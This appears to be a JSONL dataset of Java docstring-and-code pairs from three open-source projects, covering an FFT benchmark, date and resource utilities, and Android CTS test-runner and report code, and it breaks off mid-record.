{"docstring": "/** Simple Test routine. */\n", "func_signal": "public static void main(String args[])", "code": "{\n  if (args.length == 0) {\n    int n = 1024;\n    Process.get().stdout().write(\"n=\"+n+\" => RMS Error=\"+test(makeRandom(n)) + \"\\n\"); }\n  for(int i=0; i<args.length; i++) {\n    int n = Integer.parseInt(args[i]);\n    Process.get().stdout().write(\"n=\"+n+\" => RMS Error=\"+test(makeRandom(n)) + \"\\n\"); }\n}", "path": "examples\\scimark\\src\\org\\gwtnode\\examples\\scimark\\impl\\FFT.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/** Accuracy check on FFT of data. Make a copy of data, Compute the FFT, then\n  * the inverse and compare to the original.  Returns the rms difference.*/\n", "func_signal": "public static double test(double data[])", "code": "{\n  int nd = data.length;\n  // Make duplicate for comparison\n  double copy[] = new double[nd];\n  System.arraycopy(data,0,copy,0,nd);\n  // Transform & invert\n  transform(data);\n  inverse(data);\n  // Compute RMS difference.\n  double diff = 0.0;\n  for(int i=0; i<nd; i++) {\n    double d = data[i]-copy[i];\n    diff += d*d; }\n  return Math.sqrt(diff/nd); }", "path": "examples\\scimark\\src\\org\\gwtnode\\examples\\scimark\\impl\\FFT.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/*----------------------------------------------------------------------------\n                           PRIVATE METHODS\n  ------------------------------------------------------------------------ */\n", "func_signal": "private void initialize (int seed)", "code": "{\n\n    int jseed, k0, k1, j0, j1, iloop;\n\n    this.seed = seed;\n\n    m = new int[17];\n\n    jseed = Math.min(Math.abs(seed),m1);\n    if (jseed % 2 == 0) --jseed;\n    k0 = 9069 % m2;\n    k1 = 9069 / m2;\n    j0 = jseed % m2;\n    j1 = jseed / m2;\n    for (iloop = 0; iloop < 17; ++iloop) \n\t{\n\t\tjseed = j0 * k0;\n\t\tj1 = (jseed / m2 + j0 * k1 + j1 * k0) % (m2 / 2);\n\t\tj0 = jseed % m2;\n\t\tm[iloop] = j0 + m2 * j1;\n    }\n    i = 4;\n    j = 16;\n\n  }", "path": "examples\\scimark\\src\\org\\gwtnode\\examples\\scimark\\impl\\Random.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/**\n * Unescape JS strings and return them, surrounded by single quotes.\n * Specifically, this unescapes \\b, \\f, \\n, \\0, \\r, \\t, and single quotes.\n * \n * @param string The string to unescape\n * @return The unescaped string\n */\n", "func_signal": "public static String unescapeJavaScriptString(String string)", "code": "{\n    StringBuilder ret = new StringBuilder(string.length()).append('\\'');\n    for (int i = 0; i < string.length(); i++) {\n        char chr = string.charAt(i);\n        switch (chr) {\n        case '\\b':\n            ret.append(\"\\\\b\");\n            break;\n        case '\\f':\n            ret.append(\"\\\\f\");\n            break;\n        case '\\n':\n            ret.append(\"\\\\n\");\n            break;\n        case '\\0':\n            //TODO: does this even work?\n            ret.append(\"\\\\0\");\n            break;\n        case '\\r':\n            ret.append(\"\\\\r\");\n            break;\n        case '\\t':\n            ret.append(\"\\\\t\");\n            break;\n        case '\\'':\n            ret.append(\"\\\\'\");\n            break;\n        default:\n            ret.append(chr);\n        }\n    }\n    return ret.append('\\'').toString();\n}", "path": "src\\org\\gwtnode\\core\\JavaScriptUtils.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/**\n * \u5224\u65adyyyy-MM-dd \u5b57\u7b26\u4e32\u65e5\u671f\u662f\u5426\u662f\u4eca\u5929\u3002\n * <p>\n * \n * @author mgwang, 2014-5-29\n * @param dateStr\n * @return\n */\n", "func_signal": "public static boolean isToday(String dateStr)", "code": "{\n\tDate date;\n\ttry {\n\t\tdate = convertToDate(dateStr, DATE_FORMAT);\n\t} catch (ParseException e) {\n\t\treturn false;\n\t}\n\tCalendar c1 = new GregorianCalendar();\n\tc1.setTime(date);\n\tCalendar c2 = new GregorianCalendar();\n\tc2.setTime(new Date());\n\tif (DateUtils.isSameDay(c1, c2)) {\n\t\treturn true;\n\t}\n\treturn false;\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\DateUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \u8ba1\u7b97\u4e24\u4e2a\u65e5\u671f\u4e4b\u95f4\u76f8\u5dee\u7684\u5929\u6570\uff1a2014-01-01 23:59:59\u548c2014-01-02 00:00:01\u76f8\u5dee\u7684\u5929\u6570\u5e94\u8be5\u662f1\u3002\n * <p>\n * \n * @author jdzhan,2014-09-16\n * @param date1\n * @param date2\n * @return \u8fd4\u56de\u76f8\u5dee\u5929\u6570\uff0c\u5982\u679cdate1\u65e9\u4e8edate2\u8fd4\u56de\u4e00\u4e2a\u6b63\u6574\u6570\uff0c\u540c\u4e00\u5929\u8fd4\u56de0\uff0c\u5426\u5219\u8fd4\u56de\u4e00\u4e2a\u8d1f\u6574\u6570\u3002\n * @throws ParseException\n */\n", "func_signal": "public static int diffDays(Date date1, Date date2) throws ParseException", "code": "{\n\tCalendar cal = Calendar.getInstance();\n\tcal.setTime(date1);\n\tlong time1 = cal.getTimeInMillis();\n\tcal.setTime(date2);\n\tlong time2 = cal.getTimeInMillis();\n\tfloat between_days = (time2 - time1) * 1.0F / (1000 * 3600 * 24);\n\n\tif (between_days < 0 && between_days > -1) {\n\t\tif (isSameDay(date1, date2)) {\n\t\t\treturn 0;\n\t\t}\n\t\treturn -1;\n\t}\n\tif (between_days > 0 && between_days < 1) {\n\t\tif (isSameDay(date1, date2)) {\n\t\t\treturn 0;\n\t\t}\n\t\treturn 1;\n\t}\n\tif (between_days == 0) {\n\t\treturn 0;\n\t} else if (between_days < 0) {\n\t\treturn (int) Math.floor(between_days);\n\t} else {\n\t\treturn (int) Math.ceil(between_days);\n\t}\n\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\DateUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * Date\u589e\u52a0\u4e00\u5b9a\u5929\u6570\n * <p>\n * \n * @author mgwang, 2014\u5e741\u67086\u65e5\n * @param d\n *            \u539f\u59cb\u65e5\u671f\n * @param day\n *            \u589e\u52a0\u5929\u6570\n * @return \u589e\u52a0\u540e\u7684\u65e5\u671f\n */\n", "func_signal": "public static Date addDay(Date d, int day)", "code": "{\n\tCalendar calendar = Calendar.getInstance(TIME_ZONE);\n\tcalendar.setTime(d);\n\tcalendar = addDay(calendar, day);\n\treturn calendar.getTime();\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\DateUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \u5bf9json\u6807\u51c6\u5316\n * <p>\n * \n * @author chen.chen.9, 2014-3-27\n * @param original\n *            \u539f\u59cb\u5b57\u7b26\u4e32\n * @return \u751f\u6210\u5b57\u7b26\u4e32\n */\n", "func_signal": "public static String normalizeJson(String original)", "code": "{\n\treturn StringUtils.replace(NormalizationUtils.removeHorizontalTab(NormalizationUtils\n\t\t\t.removeLinefeed(NormalizationUtils.removeCarriageReturn(original))), \" \", \"\");\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\NormalizationUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \u83b7\u53d6\u7cfb\u7edf\u5f53\u524d\u65f6\u95f4\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f:yyyy-MM-dd HH:mm:ss.SSS\uff0c\u7cbe\u786e\u5230\u6beb\u79d2\n * \n * @return\n */\n", "func_signal": "public static String now()", "code": "{\n\tCalendar now = Calendar.getInstance(TIME_ZONE);\n\treturn format(now, \"yyyy-MM-dd HH:mm:ss.SSS\");\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\DateUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \u5224\u65adyyyy-MM-dd HH:mm:ss.SSS \u683c\u5f0f\u7684\u5b57\u7b26\u4e32\u65f6\u95f4\u5148\u540e\u3002\n * <p>\n * \n * @author mgwang, 2014-5-27\n * @param startTime\n * @param startTime2\n * @return\n */\n", "func_signal": "public static boolean after(String date1, String date2)", "code": "{\n\tif (StringUtils.contains(date1, \"-\") && StringUtils.contains(date1, \":\") && StringUtils.contains(date2, \"-\")\n\t\t\t&& StringUtils.contains(date2, \":\")) {\n\t\treturn after(date1, date2, DATETIME_FORMAT);\n\t}\n\treturn false;\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\DateUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \u5224\u65ad\u4e24\u4e2a\u65e5\u671f\u662f\u5426\u4e3a\u4e00\u5929\n * <p>\n * \n * @author mgwang, 2014\u5e741\u670818\u65e5\n * @param d1\n * @param d2\n * @return true or false\n */\n", "func_signal": "public static boolean isSameDay(Date d1, Date d2)", "code": "{\n\tCalendar c1 = Calendar.getInstance(TIME_ZONE);\n\tc1.setTime(d1);\n\tCalendar c2 = Calendar.getInstance(TIME_ZONE);\n\tc2.setTime(d2);\n\treturn isSameDay(c1, c2);\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\DateUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \u65f6\u95f4\u589e\u52a0\u4e00\u5b9a\u5929\u6570\n * <p>\n * \n * @author mgwang, 2013\u5e7410\u670828\u65e5\n * @param c\n * @param day\n * @return\n */\n", "func_signal": "public static Calendar addDay(Calendar c, int day)", "code": "{\n\tc.add(Calendar.DAY_OF_MONTH, day);\n\treturn c;\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\DateUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \u4ece\u9879\u76ee\uff0cjar\u6216\u6587\u4ef6\u7cfb\u7edf\u4e2d\u8bfb\u53d6\u6307\u5b9a\u8def\u5f84\u7684\u6587\u4ef6<br />\n * <p>\n * \n * @author chen.chen.9, 2014-3-19\n * @author jdzhan,\u652f\u6301file\u901a\u914d\u7b26*\u5bfb\u5740\n * @param locationPattern\n * <br/>\n *            0. \u8def\u5f84\u5bfb\u5740\u524d\u7f00\u8bf7\u53c2\u89c1{@link ResourceConstants}<br />\n *            1. \u4f7f\u7528file\uff0cclasspath\u548cclasspath*\u505a\u8def\u5f84\u5f00\u5934<br />\n *            2. classpath\u5bfb\u5740\u9879\u76ee\u4e2d\u7684\u6587\u4ef6<br />\n *            3. classpath*\u65e2\u5bfb\u5740\u9879\u76ee\uff0c\u4e5f\u5bfb\u5740jar\u5305\u4e2d\u7684\u6587\u4ef6<br />\n *            4. file\u5bfb\u5740\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u6587\u4ef6<br />\n *            5. \u9ed8\u8ba4\u662fclasspath 6.\n *            \u4f8b\u5982\uff1aclasspath*:log/log4j.xml\uff1bfile:/home/ydhl/\n *            abc.sh\uff1bclasspath:log/log4j.xml\n * @return \u4ee5URL\u8fd4\u56de\u7ed3\u679c\n * @throws IOException\n * @throws URISyntaxException\n *             \u4e2d\u6587\u8def\u5f84\u652f\u6301\n */\n", "func_signal": "public static URL[] loadResources(String locationPattern)\n\t\tthrows IOException, URISyntaxException", "code": "{\n\tif (locationPattern\n\t\t\t.startsWith(ResourceConstants.CLASSPATH_ALL_URL_PREFIX\n\t\t\t\t\t.getValue())) {\n\t\treturn load1(locationPattern);\n\t} else if (locationPattern\n\t\t\t.startsWith(ResourceConstants.CLASSPATH_URL_PREFIX.getValue())) {\n\t\treturn load2(locationPattern);\n\t} else if (locationPattern.startsWith(ResourceConstants.FILE_URL_PREFIX\n\t\t\t.getValue())) {\n\t\treturn load3(locationPattern);\n\t} else {\n\t\t// \u9ed8\u8ba4\u4e3a\u6587\u4ef6\u7cfb\u7edf\u8def\u5f84\u3002\n\t\tlocationPattern = \"file:\" + locationPattern;\n\t\treturn ResourceUtils.loadResources(locationPattern);\n\t}\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\ResourceUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \u4ece\u9879\u76ee\uff0cjar\u6216\u6587\u4ef6\u7cfb\u7edf\u4e2d\u8bfb\u53d6\u6307\u5b9a\u8def\u5f84\u7684\u6587\u4ef6<br />\n * \u4e0eloadResources()\u533a\u522b\u662f\u672c\u65b9\u6cd5\u5728\u6709\u8fd4\u56de\u503c\u65f6\u9ed8\u8ba4\u53ea\u8fd4\u56de\u4e00\u6761\u8bb0\u5f55\uff0c\u5176\u4f59\u4e22\u5f03\n * <p>\n * \n * @author chen.chen.9, 2014-3-19\n * @param locationPattern\n * <br/>\n *            0. \u8def\u5f84\u5bfb\u5740\u524d\u7f00\u8bf7\u53c2\u89c1{@link ResourceConstants}<br />\n *            1. \u4f7f\u7528file\uff0cclasspath\u548cclasspath*\u505a\u8def\u5f84\u5f00\u5934<br />\n *            2. classpath\u5bfb\u5740\u9879\u76ee\u4e2d\u7684\u6587\u4ef6<br />\n *            3. classpath*\u65e2\u5bfb\u5740\u9879\u76ee\uff0c\u4e5f\u5bfb\u5740jar\u5305\u4e2d\u7684\u6587\u4ef6<br />\n *            4. file\u5bfb\u5740\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u6587\u4ef6<br />\n *            5. \u9ed8\u8ba4\u662fclasspath 6.\n *            \u4f8b\u5982\uff1aclasspath*:log/log4j.xml;file:/home/ydhl/\n *            abc.sh;classpath:log/log4j.xml\n * @return \u4ee5URL\u8fd4\u56de\u7ed3\u679c\n * @throws IOException\n * @throws URISyntaxException\n */\n", "func_signal": "public static URL loadResource(String locationPattern) throws IOException,\n\t\tURISyntaxException", "code": "{\n\tURL[] urlArray = loadResources(locationPattern);\n\n\treturn ArrayUtils.isEmpty(urlArray) ? null : urlArray[0];\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\ResourceUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \n * Etc/GMT-8\n * \n * @author jdzhan,2014-10-16\n * \n * @return\n */\n", "func_signal": "public static Date getCurrentTime()", "code": "{\n\tCalendar calendar = Calendar.getInstance(TIME_ZONE);\n\treturn calendar.getTime();\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\DateUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \u83b7\u53d6\u683c\u5f0f\u5316\u7684\u65e5\u671f\u5b57\u7b26\u4e32\n * \n * @param date\n * @param formatString\n * @return\n */\n", "func_signal": "public static String format(Date date, String formatString)", "code": "{\n\tFastDateFormat format = FastDateFormat.getInstance(formatString, TIME_ZONE);\n\treturn format.format(date);\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\DateUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \u83b7\u53d6\u8fd0\u884c\u65f6classloader\uff0c\u9996\u9009\u7ebf\u7a0b\u4e0a\u4e0b\u6587classloader\uff0c\u5176\u6b21\u9009\u62e9\u7c7bclassloader\n * <p>\n * \n * @author chen.chen.9, 2014-3-20\n * @return {@link ClassLoader}\n */\n", "func_signal": "public static ClassLoader getDefaultClassLoader()", "code": "{\n\tif (classLoader != null) {\n\t\treturn classLoader;\n\t}\n\n\tsynchronized (BYTES) {\n\t\tif (classLoader == null) {\n\t\t\tClassLoader tempClassLoader = null;\n\t\t\ttry {\n\t\t\t\ttempClassLoader = Thread.currentThread()\n\t\t\t\t\t\t.getContextClassLoader();\n\t\t\t} catch (Exception ex) {\n\t\t\t\t// Cannot access thread context ClassLoader - falling back\n\t\t\t\t// to system class loader...\n\t\t\t}\n\n\t\t\tif (tempClassLoader == null) {\n\t\t\t\t// No thread context class loader -> use class loader of\n\t\t\t\t// this class.\n\t\t\t\ttempClassLoader = ResourceUtils.class.getClassLoader();\n\t\t\t}\n\n\t\t\tclassLoader = tempClassLoader;\n\t\t}\n\t}\n\n\treturn classLoader;\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\ResourceUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \u5bf9xml\u6807\u51c6\u5316\n * <p>\n * \n * @author chen.chen.9, 2014-3-27\n * @param original\n *            \u539f\u59cb\u5b57\u7b26\u4e32\n * @return \u751f\u6210\u5b57\u7b26\u4e32\n */\n", "func_signal": "public static String normalizeXml(String original)", "code": "{\n\treturn NormalizationUtils.removeHorizontalTab(\n\t\t\tNormalizationUtils.removeLinefeed(NormalizationUtils.removeCarriageReturn(original))).replaceAll(\n\t\t\t\">\\\\s*<\", \"><\");\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\NormalizationUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \u83b7\u53d6\u65e5\u671f\u7684\u661f\u671f\u51e0\u7684\u5b57\u7b26\u4e32\n * <p>\n * \n * @author dsfan, 2013-10-14\n * @param calendar\n * @return\n */\n", "func_signal": "public static String getWeekDayString(Calendar calendar)", "code": "{\n\tString weekstr = \"\";\n\tint week = calendar.get(Calendar.DAY_OF_WEEK);\n\tswitch (week) {\n\t// \u6ce8\u610f\uff1aCalendar\u4e2d1~7\u5206\u522b\u8868\u793a\u5468\u65e5\u3001\u5468\u4e00\u3001...\u3001\u5468\u516d\n\tcase 2:\n\t\tweekstr = \"\u5468\u4e00\";\n\t\tbreak;\n\tcase 3:\n\t\tweekstr = \"\u5468\u4e8c\";\n\t\tbreak;\n\tcase 4:\n\t\tweekstr = \"\u5468\u4e09\";\n\t\tbreak;\n\tcase 5:\n\t\tweekstr = \"\u5468\u56db\";\n\t\tbreak;\n\tcase 6:\n\t\tweekstr = \"\u5468\u4e94\";\n\t\tbreak;\n\tcase 7:\n\t\tweekstr = \"\u5468\u516d\";\n\t\tbreak;\n\tcase 1:\n\t\tweekstr = \"\u5468\u65e5\";\n\t\tbreak;\n\tdefault:\n\t\tweekstr = \"\u5468\u65e5\";\n\t}\n\treturn weekstr;\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\DateUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \u5224\u65ad\u4e24\u4e2a\u65e5\u671f\u662f\u5426\u4e3a\u4e00\u5929\n * \n * @param c1\n * @param c2\n * @return\n */\n", "func_signal": "public static boolean isSameDay(Calendar c1, Calendar c2)", "code": "{\n\treturn (c1.get(Calendar.YEAR) == c2.get(Calendar.YEAR)) && (c1.get(Calendar.MONTH) == c2.get(Calendar.MONTH))\n\t\t\t&& (c1.get(Calendar.DAY_OF_MONTH) == c2.get(Calendar.DAY_OF_MONTH));\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\DateUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \u5224\u65ad\u7684\u5b57\u7b26\u4e32\u65f6\u95f4\u5148\u540e,\u6307\u5b9a\u65f6\u95f4\u683c\u5f0f\u3002\n * <p>\n * \n * @author mgwang, 2014-5-29\n * @param date1\n * @param date2\n * @param format\n * @return\n */\n", "func_signal": "public static boolean after(String date1, String date2, String format)", "code": "{\n\ttry {\n\t\treturn convertToDate(date1, format).after(convertToDate(date2, format));\n\t} catch (ParseException e) {\n\t\treturn false;\n\t}\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\DateUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \n * \u8ba1\u7b97\u4e24\u4e2a\u65e5\u671f\u76f8\u5dee\u7684\u5929\u6570:2014-01-01 23:59:59\u548c2014-01-02 00:00:01\u76f8\u5dee\u7684\u5929\u6570\u5e94\u8be5\u662f1\u3002\n * \n * @author jdzhan,2014-10-16\n * \n * @param date1\n * @param date2\n * @param format\n *            \u6307\u5b9a\u65e5\u671f\u5b57\u7b26\u4e32\u7684\u683c\u5f0f\uff0c\u5982\uff1ayyyyMMddHHmmss,\u53ea\u652f\u6301\u5230\u79d2\n * @return \u8fd4\u56de\u76f8\u5dee\u5929\u6570\uff0c\u5982\u679cdate1\u65e9\u4e8edate2\u8fd4\u56de\u4e00\u4e2a\u6b63\u6574\u6570\uff0c\u540c\u4e00\u5929\u8fd4\u56de0\uff0c\u5426\u5219\u8fd4\u56de\u4e00\u4e2a\u8d1f\u6574\u6570\u3002\n * @throws ParseException\n */\n", "func_signal": "public static int diffDays(String date1, String date2, String format) throws ParseException", "code": "{\n\tSimpleDateFormat sf = new SimpleDateFormat(format);\n\tDate d1 = sf.parse(date1);\n\tDate d2 = sf.parse(date2);\n\treturn diffDays(d1, d2);\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\DateUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \u83b7\u53d6\u5f53\u524d\u7684\u65e5\u671f\n * \n * @author dsfan, 2013-9-16\n * @return\n * @throws ParseException\n */\n", "func_signal": "public static Calendar getToday() throws ParseException", "code": "{\n\tCalendar today = Calendar.getInstance(TIME_ZONE);\n\ttoday.setTime(convertToDate(now(\"yyyy-MM-dd\"), \"yyyy-MM-dd\"));\n\n\treturn today;\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\DateUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * \u5c06\u5b57\u7b26\u4e32\u683c\u5f0f\u5316\u4e3a\u65e5\u671f\n * \n * @param string\n * @param formatString\n * @return\n * @throws ParseException\n */\n", "func_signal": "public static Date convertToDate(String string, String formatString) throws ParseException", "code": "{\n\tSimpleDateFormat sdf = new SimpleDateFormat(formatString);\n\treturn sdf.parse(string);\n}", "path": "src\\main\\java\\io\\jindong\\pbtool\\utils\\DateUtils.java", "repo_name": "zhanjindong/protobuf-tool", "stars": 71, "license": "None", "language": "java", "size": 220}
{"docstring": "/**\n * Return the list of unique prerequisite apks to install\n * \n * @param testPackages\n */\n", "func_signal": "private Collection<String> getPrerequisiteApks(\n\t\tList<TestPackage> testPackages)", "code": "{\n\tSet<String> apkNames = new HashSet<String>();\n\tfor (TestPackage testPkg : testPackages) {\n\t\tString apkName = testPkg.mPackageDef.getTargetApkName();\n\t\tif (apkName != null) {\n\t\t\tapkNames.add(apkName);\n\t\t}\n\t}\n\treturn apkNames;\n}", "path": "src\\com\\android\\cts\\tradefed\\testtype\\CtsTest.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "/**\n * @param serverUrl to post the data to\n * @return a url if the server redirected to another url\n * @throws IOException\n */\n", "func_signal": "private String submitForm(String serverUrl) throws IOException", "code": "{\n    HttpURLConnection connection = null;\n    try {\n        URL url = new URL(serverUrl);\n        connection = (HttpURLConnection) url.openConnection();\n        connection.setInstanceFollowRedirects(false);\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n        connection.setRequestProperty(\"Content-Type\",\n                \"multipart/form-data; boundary=\" + FORM_DATA_BOUNDARY);\n\n        byte[] body = getContentBody();\n        connection.setRequestProperty(\"Content-Length\", Integer.toString(body.length));\n\n        OutputStream output = connection.getOutputStream();\n        try {\n            output.write(body);\n        } finally {\n            output.close();\n        }\n\n        // Open the stream to get a response. Otherwise request will be cancelled.\n        InputStream input = connection.getInputStream();\n        input.close();\n\n        if (connection.getResponseCode() == 302) {\n            return connection.getHeaderField(\"Location\");\n        }\n    } finally {\n        if (connection != null) {\n            connection.disconnect();\n        }\n    }\n\n    return null;\n}", "path": "src\\com\\android\\cts\\tradefed\\result\\MultipartForm.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "// \u7ed8\u56fe\n", "func_signal": "public void drawImage() throws IOException", "code": "{\n\tImageProcessing image = new ImageProcessing();\n\tfor (EventTag eventTag : items) {\n\t\tFile imageFile = new File(mLogDir,eventTag.getImage());\n\t\tFile saveTo = new File(reporterDir,imageFile.getName());\n\t\timage.open(imageFile);\n\t\tif (eventTag instanceof TapTag) {\n\t\t\tdrawCircle(image, eventTag);\n\t\t} else if (eventTag instanceof DragTag) {\n\t\t\tdrawArrowHead(image, eventTag);\n\n\t\t} else if (eventTag instanceof KeyTag) {\n\t\t\tdrawText(image, eventTag);\n\t\t}\n\t\timage.save(saveTo);\n\t\t\n\t\t\n\t\t//copy log\u6587\u4ef6\n\t\tFile logFile = new File(mLogDir,eventTag.getLog());\n\t\tFileUtil.copyFile(logFile, new File(reporterDir,logFile.getName()));\n\n\t}\n}", "path": "src\\com\\android\\cts\\tradefed\\result\\MonkeyReporter.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "/**\n * Build the list of test packages to run\n */\n", "func_signal": "private List<TestPackage> buildTestsToRun()", "code": "{\n\tList<TestPackage> testPkgList = new LinkedList<TestPackage>();\n\ttry {\n\t\tITestPackageRepo testRepo = createTestCaseRepo();\n\t\tCollection<ITestPackageDef> testPkgDefs = getTestPackagesToRun(testRepo);\n\n\t\tfor (ITestPackageDef testPkgDef : testPkgDefs) {\n\t\t\taddTestPackage(testPkgList, testPkgDef);\n\t\t}\n\t\tif (testPkgList.isEmpty()) {\n\t\t\tLog.logAndDisplay(LogLevel.WARN, LOG_TAG, \"No tests to run\");\n\t\t}\n\t} catch (FileNotFoundException e) {\n\t\tthrow new IllegalArgumentException(\"failed to find CTS plan file\",\n\t\t\t\te);\n\t} catch (ParseException e) {\n\t\tthrow new IllegalArgumentException(\"failed to parse CTS plan file\",\n\t\t\t\te);\n\t} catch (ConfigurationException e) {\n\t\tthrow new IllegalArgumentException(\"failed to process arguments\", e);\n\t}\n\treturn testPkgList;\n}", "path": "src\\com\\android\\cts\\tradefed\\testtype\\CtsTest.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "/**\n * Creates a {@link TestFilter}\n */\n", "func_signal": "public TestFilter()", "code": "{\n    mExcludedClasses = new HashSet<String>();\n    mExcludedTests = new HashSet<TestIdentifier>();\n}", "path": "src\\com\\android\\cts\\tradefed\\testtype\\TestFilter.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "/**\n * Return the list of test package defs to run\n *\n * @return the list of test package defs to run\n * @throws ParseException\n * @throws FileNotFoundException\n * @throws ConfigurationException\n */\n", "func_signal": "private Collection<ITestPackageDef> getTestPackagesToRun(\n\t\tITestPackageRepo testRepo) throws ParseException,\n\t\tFileNotFoundException, ConfigurationException", "code": "{\n\t// use LinkedHashSet to have predictable iteration order\n\tSet<ITestPackageDef> testPkgDefs = new LinkedHashSet<ITestPackageDef>();\n\tif (mPlanName != null) {\n\t\tLog.i(LOG_TAG,\n\t\t\t\tString.format(\"Executing CTS test plan %s\", mPlanName));\n\t\tFile ctsPlanFile = mCtsBuild.getTestPlanFile(mPlanName);\n\t\tITestPlan plan = createPlan(mPlanName);\n\t\tplan.parse(createXmlStream(ctsPlanFile));\n\t\tfor (String uri : plan.getTestUris()) {\n\t\t\tif (null != uri && !mExcludedPackageNames.contains(uri)) {\n\t\t\t\tITestPackageDef testPackage = testRepo.getTestPackage(uri);\n\t\t\t\ttestPackage.setExcludedTestFilter(plan\n\t\t\t\t\t\t.getExcludedTestFilter(uri));\n\t\t\t\ttestPkgDefs.add(testPackage);\n\t\t\t}\n\t\t}\n\t} else if (mPackageNames.size() > 0) {\n\t\tLog.i(LOG_TAG, String.format(\"Executing CTS test packages %s\",\n\t\t\t\tmPackageNames));\n\t\tfor (String uri : mPackageNames) {\n\t\t\tITestPackageDef testPackage = testRepo.getTestPackage(uri);\n\t\t\tif (testPackage != null) {\n\t\t\t\ttestPkgDefs.add(testPackage);\n\t\t\t} else {\n\t\t\t\tthrow new IllegalArgumentException(\n\t\t\t\t\t\tString.format(\n\t\t\t\t\t\t\t\t\"Could not find test package %s. \"\n\t\t\t\t\t\t\t\t\t\t+ \"Use 'list packages' to see available packages.\",\n\t\t\t\t\t\t\t\turi));\n\t\t\t}\n\t\t}\n\t} else if (mClassName != null) {\n\t\tLog.i(LOG_TAG,\n\t\t\t\tString.format(\"Executing CTS test class %s\", mClassName));\n\t\t// try to find package to run from class name\n\t\tString packageUri = testRepo.findPackageForTest(mClassName);\n\t\tif (packageUri != null) {\n\t\t\tITestPackageDef testPackageDef = testRepo\n\t\t\t\t\t.getTestPackage(packageUri);\n\t\t\ttestPackageDef.setClassName(mClassName, mMethodName);\n\t\t\ttestPkgDefs.add(testPackageDef);\n\t\t} else {\n\t\t\tLog.logAndDisplay(LogLevel.WARN, LOG_TAG, String.format(\n\t\t\t\t\t\"Could not find package for test class %s\", 